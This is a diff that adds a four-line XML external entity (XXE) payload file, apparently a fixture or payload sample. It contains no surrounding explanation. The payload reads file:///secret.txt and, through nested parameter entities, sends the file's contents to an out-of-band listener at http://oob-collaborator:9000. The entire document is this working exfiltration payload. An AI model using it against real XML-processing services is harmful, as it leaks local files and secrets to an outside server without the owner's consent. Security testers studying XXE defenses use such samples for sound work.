@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///secret.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://oob-collaborator:9000/log?x=%file;'>">
+%eval;
+%exfil;
